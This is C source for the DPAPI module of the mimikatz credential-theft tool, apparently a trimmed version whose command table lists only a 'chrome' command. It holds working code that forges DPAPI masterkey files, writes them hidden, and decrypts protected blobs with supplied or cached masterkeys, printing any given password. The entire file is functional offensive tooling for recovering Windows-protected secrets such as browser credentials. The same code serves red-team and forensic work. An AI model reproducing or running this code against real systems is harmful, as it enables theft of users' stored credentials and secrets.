/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi.h"

const KUHL_M_C kuhl_m_c_dpapi[] = {
	{kuhl_m_dpapi_chrome,		L"chrome",	NULL},
};
const KUHL_M kuhl_m_dpapi = {
	L"dpapi",	L"DPAPI Module", L"DPAPI",
	ARRAYSIZE(kuhl_m_c_dpapi), kuhl_m_c_dpapi, NULL, kuhl_m_dpapi_oe_clean
};

void kuhl_m_dpapi_create_data(LPCWSTR sid, LPCGUID guid, LPCBYTE key, DWORD cbKey, LPCWSTR password, LPCBYTE hash, DWORD cbHash, BOOL isProtected, DWORD flags, BOOL verbose)
{
	KULL_M_DPAPI_MASTERKEY masterkey = {2, {0}, 4000, CALG_HMAC, CALG_3DES, NULL, 0}; // XP friendly
	KULL_M_DPAPI_MASTERKEYS masterkeys = {2, 0, 0, {0}, 0, 0, flags, 0, 0, 0, 0, &masterkey, NULL, NULL, NULL};
	UNICODE_STRING uGuid;
	PBYTE data;
	wchar_t guidFilename[37];

	if(guid)
	{
		kprintf(L"Key GUID: ");
		kull_m_string_displayGUID(guid);
		kprintf(L"\n");

	if(key && cbKey)
	{
		if(NT_SUCCESS(RtlStringFromGUID(guid, &uGuid)))
		{
			CDGenerateRandomBits(masterkey.salt, sizeof(masterkey.salt));
			RtlCopyMemory(masterkeys.szGuid, uGuid.Buffer + 1, uGuid.Length - 4);
			if(password)
			{
				if(!kull_m_dpapi_protect_masterkey_with_password(masterkeys.dwFlags, &masterkey, password, sid, isProtected, key, cbKey, NULL))
					PRINT_ERROR(L"kull_m_dpapi_protect_masterkey_with_password\n");
			}
			else if(hash && cbHash)
			{
				if(!kull_m_dpapi_protect_masterkey_with_userHash(&masterkey, hash, cbHash, sid, isProtected, key, cbKey, NULL))
					PRINT_ERROR(L"kull_m_dpapi_protect_masterkey_with_userHash\n");
			}
			if(masterkey.pbKey)
			{
				if(data = kull_m_dpapi_masterkeys_tobin(&masterkeys, &masterkeys.dwMasterKeyLen))
				{
					if(verbose)
						kull_m_dpapi_masterkeys_descr(0, &masterkeys);
					RtlCopyMemory(guidFilename, masterkeys.szGuid, min(sizeof(guidFilename), sizeof(masterkeys.szGuid)));
					guidFilename[ARRAYSIZE(guidFilename) - 1] = L'\0';
					kprintf(L"File \'%s\' (hidden & system): ", guidFilename);
					if(kull_m_file_writeData(guidFilename, data, (DWORD) masterkeys.dwMasterKeyLen))
					{
						if(SetFileAttributes(guidFilename, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE))
							kprintf(L"OK\n");
						else PRINT_ERROR_AUTO(L"SetFileAttributes");
					}
					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
					LocalFree(data);
				}
				LocalFree(masterkey.pbKey);
			}
		}
	}
	else PRINT_ERROR(L"No key\n");

	}
}

BOOL kuhl_m_dpapi_unprotect_raw_or_blob(LPCVOID pDataIn, DWORD dwDataInLen, LPWSTR *ppszDataDescr, int argc, wchar_t * argv[], LPCVOID pOptionalEntropy, DWORD dwOptionalEntropyLen, LPVOID *pDataOut, DWORD *dwDataOutLen, LPCWSTR pText)
{
	BOOL status = FALSE;
	PCWSTR szEntropy, szMasterkey, szPassword = NULL;
	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT | CRYPTPROTECT_PROMPT_ON_UNPROTECT | CRYPTPROTECT_PROMPT_STRONG, NULL, MIMIKATZ}, *pPrompt;

	PBYTE masterkey = NULL, entropy = NULL;
	DWORD masterkeyLen = 0, entropyLen = 0, flags = 0;
	PKULL_M_DPAPI_BLOB blob;
	PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY entry = NULL;
	BOOL isNormalAPI = kull_m_string_args_byName(argc, argv, L"unprotect", NULL, NULL);

	if(kull_m_string_args_byName(argc, argv, L"masterkey", &szMasterkey, NULL))
		kull_m_string_stringToHexBuffer(szMasterkey, &masterkey, &masterkeyLen);
	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);
	if(kull_m_string_args_byName(argc, argv, L"entropy", &szEntropy, NULL))
		kull_m_string_stringToHexBuffer(szEntropy, &entropy, &entropyLen);
	pPrompt = kull_m_string_args_byName(argc, argv, L"prompt", NULL, NULL) ? &promptStructure : NULL;

	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		flags |= CRYPTPROTECT_LOCAL_MACHINE;

	if(blob = kull_m_dpapi_blob_create(pDataIn))
	{
		entry = kuhl_m_dpapi_oe_masterkey_get(&blob->guidMasterKey);
		if(entry || (masterkey && masterkeyLen) || isNormalAPI)
		{
			if(pText)
				kprintf(L"%s", pText);

			if(isNormalAPI)
			{
				kprintf(L"Decrypting using CryptUnprotectData \n");
			}
			
			if(entry)
			{
				kprintf(L" * volatile cache: ");
				kuhl_m_dpapi_oe_masterkey_descr(entry);
			}
			if(masterkey)
			{
				kprintf(L" * masterkey     : ");
				kull_m_string_wprintf_hex(masterkey, masterkeyLen, 0);
				kprintf(L"\n");
			}
			if(pPrompt)
			{
				kprintf(L" > prompt flags  : ");
				kull_m_dpapi_displayPromptFlags(pPrompt->dwPromptFlags);
				kprintf(L"\n");
			}
			else flags |= CRYPTPROTECT_UI_FORBIDDEN;
			if(entropy)
			{
				kprintf(L" > entropy       : ");
				kull_m_string_wprintf_hex(entropy, entropyLen, 0);
				kprintf(L"\n");
			}
			if(szPassword)
				kprintf(L" > password      : %s\n", szPassword);

			if(entry)
				status = kull_m_dpapi_unprotect_raw_or_blob(pDataIn, dwDataInLen, ppszDataDescr, (pOptionalEntropy && dwOptionalEntropyLen) ? pOptionalEntropy : entropy, (pOptionalEntropy && dwOptionalEntropyLen) ? dwOptionalEntropyLen : entropyLen, NULL, 0, pDataOut, dwDataOutLen, entry->data.keyHash, sizeof(entry->data.keyHash), szPassword);

			if(!status && ((masterkey && masterkeyLen) || isNormalAPI))
			{
				status = kull_m_dpapi_unprotect_raw_or_blob(pDataIn, dwDataInLen, ppszDataDescr, (pOptionalEntropy && dwOptionalEntropyLen) ? pOptionalEntropy : entropy, (pOptionalEntropy && dwOptionalEntropyLen) ? dwOptionalEntropyLen : entropyLen, pPrompt, flags, pDataOut, dwDataOutLen, masterkey, masterkeyLen, szPassword);
				if(status && masterkey && masterkeyLen)
					kuhl_m_dpapi_oe_masterkey_add(&blob->guidMasterKey, masterkey, masterkeyLen);

				if(!status && !masterkey)
				{
					if(GetLastError() == NTE_BAD_KEY_STATE)
					{
						PRINT_ERROR(L"NTE_BAD_KEY_STATE, needed Masterkey is: ");
						kull_m_string_displayGUID(&blob->guidMasterKey);
						kprintf(L"\n");
					}
					else PRINT_ERROR_AUTO(L"CryptUnprotectData");
				}
			}
			//kprintf(L"\n");
		}
		kull_m_dpapi_blob_delete(blob);
	}

	if(entropy)
		LocalFree(entropy);
	if(masterkey)
		LocalFree(masterkey);
	return status;
}